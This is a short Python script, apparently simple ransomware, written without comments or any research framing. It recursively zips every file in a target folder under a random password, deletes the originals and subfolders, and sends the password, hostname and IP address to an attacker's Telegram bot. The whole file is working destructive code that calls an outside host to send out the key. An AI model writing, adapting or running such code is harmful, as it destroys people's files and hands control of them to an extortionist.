import os
import random
import string
import shutil
import requests
import socket
import pyminizip
ipme = requests.get("https://api.ipify.org").text
def Golden1(length=14):
    characters = string.ascii_letters + string.digits + string.punctuation
    GoldPas = ''.join(random.choice(characters) for i in range(length))
    return GoldPas

def Golden2(GoldFile, GoldZip, GoldPas):
    files = []
    for root, dirs, files_in_dir in os.walk(GoldFile):
        for file in files_in_dir:
            file_path = os.path.join(root, file)
            files.append(file_path)
    pyminizip.compress_multiple(files, [], GoldZip, GoldPas, 5)

def Golden3(GoldFile, GoldZip):
    for root, dirs, files in os.walk(GoldFile):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path != GoldZip:
                os.remove(file_path)
        for dir in dirs:
            shutil.rmtree(os.path.join(root, dir))

def Golden4():
    GoldDv = socket.gethostname()
    Goldip = socket.gethostbyname(GoldDv)
    return GoldDv, Goldip

def Golden5(GoldPas, GoldTok, GoldID, GoldDv, ipme):
    message = f"password : {GoldPas}\nDevice : {GoldDv}\nip : {ipme}"
    url = f"https://api.telegram.org/bot{GoldTok}/sendMessage"
    data = {"chat_id": GoldID, "text": message}
    response = requests.post(url, data=data)

def Golden(GoldFile, GoldTok, GoldID, ZipFilename):
    GoldZip = os.path.join(GoldFile, ZipFilename)
    
    if os.path.exists(GoldZip):
        os.remove(GoldZip)
    
    GoldPas = Golden1()
    Golden2(GoldFile, GoldZip, GoldPas)
    Golden3(GoldFile, GoldZip)
    GoldDv, Goldip = Golden4()
    Golden5(GoldPas, GoldTok, GoldID, GoldDv, Goldip)
